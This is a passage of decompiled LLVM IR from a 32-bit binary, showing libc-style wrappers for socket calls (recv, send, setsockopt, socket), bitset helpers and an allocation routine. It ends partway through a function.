define i32 @function_405d90(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_405d90:
  %s0.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* @a3, align 4
  %v5_405db0 = call i32 @recv(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  %v3_405db4 = load i32, i32* @global_var_449abc.83, align 4
  store i32 %v3_405db4, i32* @t9, align 4
  %v1_405db8 = icmp eq i32 %arg4, 0
  store i32 %v5_405db0, i32* %s0.global-to-local, align 4
  br i1 %v1_405db8, label %dec_label_pc_405dd4, label %dec_label_pc_405dbc

dec_label_pc_405dbc:                              ; preds = %dec_label_pc_405d90
  %v1_405dc0 = call i32 @function_4056e0()
  %v0_405dcc = load i32, i32* %s0.global-to-local, align 4
  %v2_405dcc = inttoptr i32 %v1_405dc0 to i32*
  store i32 %v0_405dcc, i32* %v2_405dcc, align 4
  br label %dec_label_pc_405dd4

dec_label_pc_405dd4:                              ; preds = %dec_label_pc_405d90, %dec_label_pc_405dbc
  %v4_405ddc = phi i32 [ %v5_405db0, %dec_label_pc_405d90 ], [ -1, %dec_label_pc_405dbc ]
  ret i32 %v4_405ddc

; uselistorder directives
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_405dd4, { 1, 0 }
}

define i32 @function_405df0(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_405df0:
  %s0.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* @a3, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* @a1, align 4
  store i32 %arg5, i32* %s0.global-to-local, align 4
  %v5_405e30 = call i32 @recvfrom(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, %sockaddr* null, i32* null)
  %v3_405e38 = load i32, i32* @global_var_449abc.83, align 4
  store i32 %v3_405e38, i32* @t9, align 4
  %v1_405e3c = icmp eq i32 %arg4, 0
  store i32 %v5_405e30, i32* %s0.global-to-local, align 4
  br i1 %v1_405e3c, label %dec_label_pc_405e58, label %dec_label_pc_405e40

dec_label_pc_405e40:                              ; preds = %dec_label_pc_405df0
  %v1_405e44 = call i32 @function_4056e0()
  %v0_405e50 = load i32, i32* %s0.global-to-local, align 4
  %v2_405e50 = inttoptr i32 %v1_405e44 to i32*
  store i32 %v0_405e50, i32* %v2_405e50, align 4
  br label %dec_label_pc_405e58

dec_label_pc_405e58:                              ; preds = %dec_label_pc_405df0, %dec_label_pc_405e40
  %v4_405e68 = phi i32 [ %v5_405e30, %dec_label_pc_405df0 ], [ -1, %dec_label_pc_405e40 ]
  ret i32 %v4_405e68

; uselistorder directives
  uselistorder label %dec_label_pc_405e58, { 1, 0 }
}

define i32 @function_405e70(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_405e70:
  %s0.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* @a3, align 4
  %v5_405e90 = call i32 @send(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  %v3_405e94 = load i32, i32* @global_var_449abc.83, align 4
  store i32 %v3_405e94, i32* @t9, align 4
  %v1_405e98 = icmp eq i32 %arg4, 0
  store i32 %v5_405e90, i32* %s0.global-to-local, align 4
  br i1 %v1_405e98, label %dec_label_pc_405eb4, label %dec_label_pc_405e9c

dec_label_pc_405e9c:                              ; preds = %dec_label_pc_405e70
  %v1_405ea0 = call i32 @function_4056e0()
  %v0_405eac = load i32, i32* %s0.global-to-local, align 4
  %v2_405eac = inttoptr i32 %v1_405ea0 to i32*
  store i32 %v0_405eac, i32* %v2_405eac, align 4
  br label %dec_label_pc_405eb4

dec_label_pc_405eb4:                              ; preds = %dec_label_pc_405e70, %dec_label_pc_405e9c
  %v4_405ebc = phi i32 [ %v5_405e90, %dec_label_pc_405e70 ], [ -1, %dec_label_pc_405e9c ]
  ret i32 %v4_405ebc

; uselistorder directives
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_405eb4, { 1, 0 }
}

define i32 @function_405ed0(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_405ed0:
  %s0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* @a3, align 4
  %v5_405f08 = call i32 @setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 0)
  %v3_405f10 = load i32, i32* @global_var_449abc.83, align 4
  store i32 %v3_405f10, i32* @t9, align 4
  %v1_405f14 = icmp eq i32* %arg4, null
  store i32 %v5_405f08, i32* %s0.global-to-local, align 4
  br i1 %v1_405f14, label %dec_label_pc_405f30, label %dec_label_pc_405f18

dec_label_pc_405f18:                              ; preds = %dec_label_pc_405ed0
  %v1_405f1c = call i32 @function_4056e0()
  %v0_405f28 = load i32, i32* %s0.global-to-local, align 4
  %v2_405f28 = inttoptr i32 %v1_405f1c to i32*
  store i32 %v0_405f28, i32* %v2_405f28, align 4
  br label %dec_label_pc_405f30

dec_label_pc_405f30:                              ; preds = %dec_label_pc_405ed0, %dec_label_pc_405f18
  %v4_405f40 = phi i32 [ %v5_405f08, %dec_label_pc_405ed0 ], [ -1, %dec_label_pc_405f18 ]
  ret i32 %v4_405f40

; uselistorder directives
  uselistorder label %dec_label_pc_405f30, { 1, 0 }
}

define i32 @function_405f50(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405f50:
  %s0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @a1, align 4
  %v3_405f70 = call i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3)
  %v3_405f74 = load i32, i32* @global_var_449abc.83, align 4
  store i32 %v3_405f74, i32* @t9, align 4
  %v0_405f78 = load i32, i32* @a3, align 4
  %v1_405f78 = icmp eq i32 %v0_405f78, 0
  store i32 %v3_405f70, i32* %s0.global-to-local, align 4
  br i1 %v1_405f78, label %dec_label_pc_405f94, label %dec_label_pc_405f7c

dec_label_pc_405f7c:                              ; preds = %dec_label_pc_405f50
  %v1_405f80 = call i32 @function_4056e0()
  %v0_405f8c = load i32, i32* %s0.global-to-local, align 4
  %v2_405f8c = inttoptr i32 %v1_405f80 to i32*
  store i32 %v0_405f8c, i32* %v2_405f8c, align 4
  br label %dec_label_pc_405f94

dec_label_pc_405f94:                              ; preds = %dec_label_pc_405f50, %dec_label_pc_405f7c
  %v4_405f9c = phi i32 [ %v3_405f70, %dec_label_pc_405f50 ], [ -1, %dec_label_pc_405f7c ]
  ret i32 %v4_405f9c

; uselistorder directives
  uselistorder label %dec_label_pc_405f94, { 1, 0 }
}

define i32 @function_405fb0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_405fb0:
  %a0.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %a0.global-to-local, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v0_405fc4 = load i32, i32* @s0, align 4
  store i32 -1, i32* %v0.global-to-local, align 4
  %v2_405fd0 = icmp eq i32 %arg2, -1
  store i32 %arg1, i32* @s0, align 4
  br i1 %v2_405fd0, label %dec_label_pc_405fe8, label %dec_label_pc_405fd4

dec_label_pc_405fd4:                              ; preds = %dec_label_pc_405fb0
  %v1_405fd8 = icmp slt i32 %arg1, 1
  %v3_405fd8 = icmp slt i32 %arg1, 128
  %v4_405fd8 = zext i1 %v3_405fd8 to i32
  store i32 %v4_405fd8, i32* %v0.global-to-local, align 4
  br i1 %v1_405fd8, label %dec_label_pc_405fe8, label %dec_label_pc_405fdc

dec_label_pc_405fdc:                              ; preds = %dec_label_pc_405fd4
  %v1_405fe0 = icmp eq i1 %v3_405fd8, false
  store i32 32, i32* %v1.global-to-local, align 4
  br i1 %v1_405fe0, label %dec_label_pc_405fe8, label %dec_label_pc_40600c

dec_label_pc_405fe8:                              ; preds = %dec_label_pc_405fdc, %dec_label_pc_405fd4, %dec_label_pc_405fb0
  %v3_405fe8 = load i32, i32* @global_var_449abc.83, align 4
  store i32 %v3_405fe8, i32* @t9, align 4
  %v1_405ff0 = call i32 @function_4056e0()
  store i32 %v1_405ff0, i32* %v0.global-to-local, align 4
  store i32 22, i32* %v1.global-to-local, align 4
  store i32 -1, i32* %a0.global-to-local, align 4
  %v2_406008 = inttoptr i32 %v1_405ff0 to i32*
  store i32 22, i32* %v2_406008, align 4
  %v0_406018.pre.pre = load i32, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_40600c

dec_label_pc_40600c:                              ; preds = %dec_label_pc_405fdc, %dec_label_pc_405fe8
  %v0_406018.pre = phi i32 [ %v4_405fd8, %dec_label_pc_405fdc ], [ %v0_406018.pre.pre, %dec_label_pc_405fe8 ]
  %v2_40600c = ptrtoint i32* %stack_var_-296 to i32
  store i32 %v2_40600c, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_406018

dec_label_pc_406018:                              ; preds = %dec_label_pc_406018, %dec_label_pc_40600c
  %v0_406018 = phi i32 [ %v4_406024, %dec_label_pc_406018 ], [ %v0_406018.pre, %dec_label_pc_40600c ]
  %v1_406018 = add i32 %v0_406018, 8
  %v2_406018 = inttoptr i32 %v1_406018 to i32*
  store i32 0, i32* %v2_406018, align 4
  %v0_40601c = load i32, i32* %v1.global-to-local, align 4
  %v1_40601c = add i32 %v0_40601c, -1
  store i32 %v1_40601c, i32* %v1.global-to-local, align 4
  %v1_406020 = mul i32 %v1_40601c, 4
  %v1_406024 = icmp sgt i32 %v1_40601c, -1
  %v3_406024 = load i32, i32* %a0.global-to-local, align 4
  %v4_406024 = add i32 %v3_406024, %v1_406020
  store i32 %v4_406024, i32* %v0.global-to-local, align 4
  br i1 %v1_406024, label %dec_label_pc_406018, label %dec_label_pc_406028

dec_label_pc_406028:                              ; preds = %dec_label_pc_406018
  %v2_406030 = ptrtoint i32* %stack_var_-288 to i32
  store i32 %v2_406030, i32* %a0.global-to-local, align 4
  %v1_406034 = load i32, i32* @s0, align 4
  %v4_406034 = call i32 @function_4060d8(i32 %v2_406030, i32 %v1_406034)
  store i32 %v4_406034, i32* %v0.global-to-local, align 4
  %v1_406040 = icmp slt i32 %v4_406034, 0
  store i32 -1, i32* %a0.global-to-local, align 4
  br i1 %v1_406040, label %dec_label_pc_406098, label %dec_label_pc_406044

dec_label_pc_406044:                              ; preds = %dec_label_pc_406028
  %v3_40604c = load i32, i32* bitcast (i32** @global_var_4499e0.197 to i32*), align 4
  store i32 %v3_40604c, i32* %a0.global-to-local, align 4
  %v1_406050 = load i32, i32* @s0, align 4
  %v4_406050 = call i32 @function_4060b0(i32 %v3_40604c, i32 %v1_406050)
  %v1_40605c = icmp eq i32 %v4_406050, 0
  %v1_406060 = select i1 %v1_40605c, i32 268435456, i32 0
  store i32 %v1_406060, i32* @v0, align 4
  %v3_406064 = load i32, i32* @global_var_449c78.198, align 4
  store i32 %v3_406064, i32* @t9, align 4
  store i32 %v1_406060, i32* %stack_var_-296, align 4
  %v0_40606c = load i32, i32* @s0, align 4
  store i32 %v0_40606c, i32* %a0.global-to-local, align 4
  %v3_406074 = ptrtoint i32* %stack_var_-152 to i32
  %v8_406074 = call i32 @function_407230(i32 %v0_40606c, i32* nonnull %stack_var_-296, i32 %v3_406074)
  store i32 %v8_406074, i32* %v0.global-to-local, align 4
  %v1_406080 = icmp slt i32 %v8_406074, 0
  br i1 %v1_406080, label %dec_label_pc_406094, label %dec_label_pc_406084

dec_label_pc_406084:                              ; preds = %dec_label_pc_406044
  br label %dec_label_pc_406094

dec_label_pc_406094:                              ; preds = %dec_label_pc_406044, %dec_label_pc_406084
  store i32 -1, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_406098

dec_label_pc_406098:                              ; preds = %dec_label_pc_406028, %dec_label_pc_406094
  store i32 %v0_405fc4, i32* @s0, align 4
  store i32 -1, i32* %v0.global-to-local, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_406060, { 1, 0 }
  uselistorder i32 %v4_406024, { 1, 0 }
  uselistorder i32 %v1_40601c, { 1, 0, 2 }
  uselistorder i32* %v1.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %v0.global-to-local, { 0, 1, 3, 2, 6, 7, 4, 5 }
  uselistorder i32* %a0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_406098, { 1, 0 }
  uselistorder label %dec_label_pc_406094, { 1, 0 }
  uselistorder label %dec_label_pc_40600c, { 1, 0 }
}

define i32 @function_4060b0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_4060b0:
  %v1_4060b0 = add i32 %arg2, -1
  %v1_4060b4 = udiv i32 %v1_4060b0, 32
  %v1_4060b8 = mul nuw nsw i32 %v1_4060b4, 4
  %v2_4060bc = add i32 %v1_4060b8, %arg1
  %v1_4060c0 = inttoptr i32 %v2_4060bc to i32*
  %v2_4060c0 = load i32, i32* %v1_4060c0, align 4
  store i32 %v2_4060c0, i32* @v1, align 4
  %v2_4060c8 = shl i32 1, %v1_4060b0
  %v2_4060cc = and i32 %v2_4060c0, %v2_4060c8
  %v2_4060d0 = icmp ne i32 %v2_4060cc, 0
  %v3_4060d0 = zext i1 %v2_4060d0 to i32
  ret i32 %v3_4060d0

; uselistorder directives
  uselistorder i32 %v1_4060b0, { 1, 0 }
}

define i32 @function_4060d8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_4060d8:
  %v1_4060d8 = add i32 %arg2, -1
  %v1_4060dc = udiv i32 %v1_4060d8, 32
  %v1_4060e0 = mul nuw nsw i32 %v1_4060dc, 4
  %v2_4060e4 = add i32 %v1_4060e0, %arg1
  %v1_4060e8 = inttoptr i32 %v2_4060e4 to i32*
  %v2_4060e8 = load i32, i32* %v1_4060e8, align 4
  %v2_4060f0 = shl i32 1, %v1_4060d8
  %v2_4060f4 = or i32 %v2_4060e8, %v2_4060f0
  store i32 %v2_4060f4, i32* %v1_4060e8, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_4060d8, { 1, 0 }
}

define i32 @function_406104(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_406104:
  %v1_406104 = add i32 %arg2, -1
  %v1_406108 = udiv i32 %v1_406104, 32
  %v1_40610c = mul nuw nsw i32 %v1_406108, 4
  %v2_406110 = add i32 %v1_40610c, %arg1
  %v1_406118 = inttoptr i32 %v2_406110 to i32*
  %v2_406118 = load i32, i32* %v1_406118, align 4
  %tmp = shl i32 -1, %v1_406104
  %v1_406120 = add i32 %tmp, -1
  %v2_406124 = and i32 %v2_406118, %v1_406120
  store i32 %v2_406124, i32* %v1_406118, align 4
  ret i32 0
}

define i32 @function_406140(i32 %arg1) local_unnamed_addr {
dec_label_pc_406140:
  %a0.global-to-local = alloca i32, align 4
  %gp.global-to-local = alloca i32, align 4
  %s0.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %a0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v1_406148 = load i32, i32* @t9, align 4
  %v2_406148 = add i32 %v1_406148, 309360
  store i32 %v2_406148, i32* %gp.global-to-local, align 4
  %v0_406154 = load i32, i32* @s1, align 4
  %v0_406158 = load i32, i32* @s0, align 4
  %v0_406160 = load i32, i32* %a0.global-to-local, align 4
  %v1_406160 = icmp eq i32 %v0_406160, 0
  %v3_406160 = icmp ult i32 %v0_406160, -7
  %v4_406160 = zext i1 %v3_406160 to i32
  store i32 %v4_406160, i32* %v0.global-to-local, align 4
  br i1 %v1_406160, label %dec_label_pc_406164, label %dec_label_pc_406170

dec_label_pc_406164:                              ; preds = %dec_label_pc_406140
  store i32 1, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_406170

dec_label_pc_406170:                              ; preds = %dec_label_pc_406140, %dec_label_pc_406164
  %v0_40617c = phi i32 [ %v0_406160, %dec_label_pc_406140 ], [ 1, %dec_label_pc_406164 ]
  %v1_406170 = icmp eq i1 %v3_406160, false
  br i1 %v1_406170, label %dec_label_pc_4062f8, label %dec_label_pc_406174

dec_label_pc_406174:                              ; preds = %dec_label_pc_406170
  %v1_40617c = add i32 %v0_40617c, 4
  store i32 %v1_40617c, i32* %v0.global-to-local, align 4
  %v3_406180 = load i32, i32* bitcast (i32** @global_var_449bf8.200 to i32*), align 4
  store i32 %v3_406180, i32* %a0.global-to-local, align 4
  store i32 %v1_40617c, i32* %stack_var_-24, align 4
  %v6_406184 = call i32 @function_406da4(i32 %v3_406180)
  store i32 %v6_406184, i32* %v0.global-to-local, align 4
  store i32 %v2_406148, i32* %gp.global-to-local, align 4
  %v3_406198 = load i32, i32* bitcast (i32*** @global_var_449be0.204 to i32*), align 4
  store i32 %v3_406198, i32* %a0.global-to-local, align 4
  %v3_40619c = ptrtoint i32* %stack_var_-24 to i32
  %tmp11 = inttoptr i32 %v3_406198 to i32*
  %v8_40619c = call i32 @function_406580(i32* %tmp11, i32 %v3_40619c)
  store i32 %v8_40619c, i32* %v0.global-to-local, align 4
  store i32 %v2_406148, i32* %gp.global-to-local, align 4
  %v3_4061b0 = load i32, i32* bitcast (i32** @global_var_449bf8.200 to i32*), align 4
  store i32 %v3_4061b0, i32* %a0.global-to-local, align 4
  store i32 %v8_40619c, i32* %s0.global-to-local, align 4
  %v3_4061b4 = call i32 @function_406da4(i32 %v3_4061b0)
  store i32 %v3_4061b4, i32* %v0.global-to-local, align 4
  store i32 %v2_406148, i32* %gp.global-to-local, align 4
  %v1_4061c0 = icmp eq i32 %v8_40619c, 0
  br i1 %v1_4061c0, label %dec_label_pc_4061c4, label %dec_label_pc_4062e0

dec_label_pc_4061c4:                              ; preds = %dec_label_pc_406174
  %v1_4061c8 = add i32 %v1_406148, 276880
  %v2_4061c8 = inttoptr i32 %v1_4061c8 to i32*
  %v3_4061c8 = load i32, i32* %v2_4061c8, align 4
  store i32 %v3_4061c8, i32* %v0.global-to-local, align 4
  %v3_4061cc = load i32, i32* %stack_var_-24, align 4
  %v1_4061d0 = inttoptr i32 %v3_4061c8 to i32*
  %v2_4061d0 = load i32, i32* %v1_4061d0, align 4
  store i32 %v2_4061d0, i32* @s0, align 4
  %v2_4061d8 = icmp ult i32 %v3_4061cc, %v2_4061d0
  %v4_4061dc = add i32 %v2_4061d0, %v3_4061cc
  store i32 %v4_4061dc, i32* %v0.global-to-local, align 4
  br i1 %v2_4061d8, label %dec_label_pc_4061f0, label %dec_label_pc_4061e0

dec_label_pc_4061e0:                              ; preds = %dec_label_pc_4061c4
  %v1_4061e4 = add i32 %v4_4061dc, -1
  store i32 %v1_4061e4, i32* %v0.global-to-local, align 4
  %v1_4061e8 = sub i32 0, %v2_4061d0
  %v2_4061ec = and i32 %v1_4061e4, %v1_4061e8
  store i32 %v2_4061ec, i32* @s0, align 4
  br label %dec_label_pc_4061f0

dec_label_pc_4061f0:                              ; preds = %dec_label_pc_4061c4, %dec_label_pc_4061e0
  %v3_4061f4 = load i32, i32* bitcast (i32** @global_var_449af4.208 to i32*), align 4
  store i32 %v3_4061f4, i32* %a0.global-to-local, align 4
  %v2_4061f8 = call i32 @function_406da4(i32 %v3_4061f4)
  store i32 %v2_4061f8, i32* %v0.global-to-local, align 4
  store i32 %v2_406148, i32* %gp.global-to-local, align 4
  %v3_406208 = load i32, i32* @global_var_449c38.209, align 4
  store i32 %v3_406208, i32* @t9, align 4
  %v1_406210 = load i32, i32* @s0, align 4
  store i32 %v1_406210, i32* %a0.global-to-local, align 4
  %v3_406210 = call i32 @function_407a20(i32 %v1_406210)
  store i32 -1, i32* %v0.global-to-local, align 4
  store i32 %v2_406148, i32* %gp.global-to-local, align 4
  %v2_406224 = icmp eq i32 %v3_406210, -1
  %v4_406224 = add i32 %v3_406210, 3
  br i1 %v2_406224, label %dec_label_pc_406228, label %dec_label_pc_406234

dec_label_pc_406228:                              ; preds = %dec_label_pc_4061f0
  br label %dec_label_pc_406234

dec_label_pc_406234:                              ; preds = %dec_label_pc_4061f0, %dec_label_pc_406228
  store i32 -4, i32* %v0.global-to-local, align 4
  %v2_406238 = and i32 %v4_406224, -4
  store i32 %v2_406238, i32* @s1, align 4
  %v2_40623c = icmp eq i32 %v2_406238, %v3_406210
  br i1 %v2_40623c, label %dec_label_pc_40625c, label %dec_label_pc_406240

dec_label_pc_406240:                              ; preds = %dec_label_pc_406234
  %v3_406244 = load i32, i32* @global_var_449c38.209, align 4
  store i32 %v3_406244, i32* @t9, align 4
  %v3_40624c = sub i32 %v2_406238, %v3_406210
  store i32 %v3_40624c, i32* %a0.global-to-local, align 4
  %v5_40624c = call i32 @function_407a20(i32 %v3_40624c)
  store i32 %v5_40624c, i32* %v0.global-to-local, align 4
  store i32 %v2_406148, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_40625c

dec_label_pc_40625c:                              ; preds = %dec_label_pc_406234, %dec_label_pc_406240
  %v3_406260 = load i32, i32* bitcast (i32** @global_var_449af4.208 to i32*), align 4
  store i32 %v3_406260, i32* %a0.global-to-local, align 4
  %v2_406264 = call i32 @function_406da4(i32 %v3_406260)
  store i32 -1, i32* %v0.global-to-local, align 4
  store i32 %v2_406148, i32* %gp.global-to-local, align 4
  %v0_406274 = load i32, i32* @s1, align 4
  %v2_406274 = icmp eq i32 %v0_406274, -1
  br i1 %v2_406274, label %dec_label_pc_4062f8, label %dec_label_pc_406278

dec_label_pc_406278:                              ; preds = %dec_label_pc_40625c
  %v3_406280 = load i32, i32* bitcast (i32** @global_var_449bf8.200 to i32*), align 4
  store i32 %v3_406280, i32* %a0.global-to-local, align 4
  %v2_406284 = call i32 @function_406da4(i32 %v3_406280)
  store i32 %v2_406284, i32* @v0, align 4
  store i32 %v2_406148, i32* %gp.global-to-local, align 4
  %v0_406290 = load i32, i32* @s0, align 4
  %v3_406294 = load i32, i32* @global_var_449c20.210, align 4
  store i32 %v3_406294, i32* @t9, align 4
  %v3_406298 = load i32, i32* bitcast (i32*** @global_var_449be0.204 to i32*), align 4
  store i32 %v3_406298, i32* %a0.global-to-local, align 4
  %v1_40629c = load i32, i32* @s1, align 4
  %tmp12 = inttoptr i32 %v3_406298 to i32*
  %v7_40629c = call i32 @function_406688(i32* %tmp12, i32 %v1_40629c, i32 %v0_406290)
  store i32 %v7_40629c, i32* %v0.global-to-local, align 4
  store i32 %v2_406148, i32* %gp.global-to-local, align 4
  %v3_4062b0 = load i32, i32* bitcast (i32*** @global_var_449be0.204 to i32*), align 4
  store i32 %v3_4062b0, i32* %a0.global-to-local, align 4
  %tmp13 = inttoptr i32 %v3_4062b0 to i32*
  %v8_4062b4 = call i32 @function_406580(i32* %tmp13, i32 %v3_40619c)
  store i32 %v8_4062b4, i32* %v0.global-to-local, align 4
  store i32 %v2_406148, i32* %gp.global-to-local, align 4
  %v3_4062c8 = load i32, i32* bitcast (i32** @global_var_449bf8.200 to i32*), align 4
  store i32 %v3_4062c8, i32* %a0.global-to-local, align 4
  store i32 %v8_4062b4, i32* %s0.global-to-local, align 4
  %v3_4062cc = call i32 @function_406da4(i32 %v3_4062c8)
  store i32 %v3_4062cc, i32* %v0.global-to-local, align 4
  store i32 %v2_406148, i32* %gp.global-to-local, align 4
  %v1_4062d8 = icmp eq i32 %v8_4062b4, 0
  br i1 %v1_4062d8, label %dec_label_pc_4062f8, label %dec_label_pc_4062e0

dec_label_pc_4062e0:                              ; preds = %dec_label_pc_406278, %dec_label_pc_406174
  %v1_4062e8 = phi i32 [ %v8_4062b4, %dec_label_pc_406278 ], [ %v8_40619c, %dec_label_pc_406174 ]
  %v3_4062e0 = load i32, i32* %stack_var_-24, align 4
  %v2_4062e8 = inttoptr i32 %v1_4062e8 to i32*
  store i32 %v3_4062e0, i32* %v2_4062e8, align 4
  %v0_4062ec = load i32, i32* %s0.global-to-local, align 4
  %v1_4062ec = add i32 %v0_4062ec, 4
  store i32 %v1_4062ec, i32* %s0.global-to-local, align 4
  %v1_4062f0 = icmp eq i32 %v1_4062ec, 0
  store i32 %v1_4062ec, i32* %v0.global-to-local, align 4
  br i1 %v1_4062f0, label %dec_label_pc_4062e0.dec_label_pc_4062f8_crit_edge, label %dec_label_pc_406318

dec_label_pc_4062e0.dec_label_pc_4062f8_crit_edge: ; preds = %dec_label_pc_4062e0
  %v0_4062f8.pre = load i32, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_4062f8

dec_label_pc_4062f8:                              ; preds = %dec_label_pc_4062e0.dec_label_pc_4062f8_crit_edge, %dec_label_pc_406170, %dec_label_pc_406278, %dec_label_pc_40625c
  %v0_4062f8 = phi i32 [ %v0_4062f8.pre, %dec_label_pc_4062e0.dec_label_pc_4062f8_crit_edge ], [ %v2_406148, %dec_label_pc_406170 ], [ %v2_406148, %dec_label_pc_406278 ], [ %v2_406148, %dec_label_pc_40625c ]
  %v1_4062f8 = add i32 %v0_4062f8, -32500
  %v2_4062f8 = inttoptr i32 %v1_4062f8 to i32*
  %v3_4062f8 = load i32, i32* %v2_4062f8, align 4
  store i32 0, i32* %s0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4062f8)
  store i32 %v2_406148, i32* %gp.global-to-local, align 4
  %v1_406310 = load i32, i32* %v0.global-to-local, align 4
  %v2_406310 = inttoptr i32 %v1_406310 to i32*
  store i32 12, i32* %v2_406310, align 4
  %v0_406314 = load i32, i32* %s0.global-to-local, align 4
  store i32 %v0_406314, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_406318

dec_label_pc_406318:                              ; preds = %dec_label_pc_4062e0, %dec_label_pc_4062f8
  %v4_406324 = phi i32 [ %v1_4062ec, %dec_label_pc_4062e0 ], [ %v0_406314, %dec_label_pc_4062f8 ]
  store i32 %v0_406154, i32* @s1, align 4
  store i32 %v0_406158, i32* @s0, align 4
  ret i32 %v4_406324

; uselistorder directives
  uselistorder i32 %v8_4062b4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_406238, { 1, 0, 2 }
  uselistorder i32 %v3_406210, { 1, 0, 2, 3 }
  uselistorder i32 %v2_4061d0, { 1, 0, 2, 3 }
  uselistorder i32 %v8_40619c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_406148, { 3, 0, 1, 2, 13, 12, 11, 10, 9, 14, 8, 7, 6, 5, 4, 15 }
  uselistorder i32* %stack_var_-24, { 0, 1, 3, 2 }
  uselistorder i32* %v0.global-to-local, { 12, 17, 13, 14, 15, 16, 18, 2, 0, 1, 6, 3, 4, 5, 7, 8, 11, 9, 10 }
  uselistorder i32* %s0.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %gp.global-to-local, { 7, 8, 9, 10, 11, 12, 13, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32* %a0.global-to-local, { 9, 10, 11, 12, 13, 2, 3, 4, 5, 6, 7, 8, 0, 1 }
  uselistorder i32 (i32*, i32)* @function_406580, { 1, 0 }
  uselistorder label %dec_label_pc_406318, { 1, 0 }
  uselistorder label %dec_label_pc_4062f8, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_40625c, { 1, 0 }
  uselistorder label %dec_label_pc_406234, { 1, 0 }
  uselistorder label %dec_label_pc_4061f0, { 1, 0 }
  uselistorder label %dec_label_pc_406170, { 1, 0 }
}

define i32 @function_406330(i64 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_406330:
  %s0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  %tmp = trunc i64 %arg1 to i32
  %v3_406350 = sext i32 %arg2 to i64
  %v5_406350 = mul nsw i64 %v3_406350, %arg1
  %v6_406350 = trunc i64 %v5_406350 to i32
  %v3_406354 = load i32, i32* @global_var_449c08.14, align 4
  store i32 %v6_406350, i32* %s0.global-to-local, align 4
  %v2_40635c = icmp eq i32 %tmp, 0
  store i32 %v3_406354, i32* %v1.global-to-local, align 4
  br i1 %v2_40635c, label %dec_label_pc_406398, label %dec_label_pc_406360

dec_label_pc_406360:                              ; preds = %dec_label_pc_406330
  %v6_406364 = udiv i32 %v6_406350, %tmp
  %v3_406370 = load i32, i32* @global_var_449abc.83, align 4
  store i32 %v3_406370, i32* @t9, align 4
  store i32 %v6_406364, i32* @v0, align 4
  %v2_406378 = icmp eq i32 %v6_406364, %arg2
  store i32 0, i32* %s1.global-to-local, align 4
  br i1 %v2_406378, label %dec_label_pc_406398, label %dec_label_pc_40637c

dec_label_pc_40637c:                              ; preds = %dec_label_pc_406360
  %v1_406380 = call i32 @function_4056e0()
  store i32 %v1_406380, i32* @v0, align 4
  store i32 12, i32* %v1.global-to-local, align 4
  %v2_406394 = inttoptr i32 %v1_406380 to i32*
  store i32 12, i32* %v2_406394, align 4
  %v0_406398.pre = load i32, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_406398

dec_label_pc_406398:                              ; preds = %dec_label_pc_406360, %dec_label_pc_406330, %dec_label_pc_40637c
  %v0_406398 = phi i32 [ %v3_406354, %dec_label_pc_406360 ], [ %v3_406354, %dec_label_pc_406330 ], [ %v0_406398.pre, %dec_label_pc_40637c ]
  call void @__pseudo_call(i32 %v0_406398)
  %v0_4063a8 = load i32, i32* @v0, align 4
  store i32 %v0_4063a8, i32* %s1.global-to-local, align 4
  %v1_4063b8 = icmp eq i32 %v0_4063a8, 0
  br i1 %v1_4063b8, label %dec_label_pc_4063cc, label %dec_label_pc_4063bc

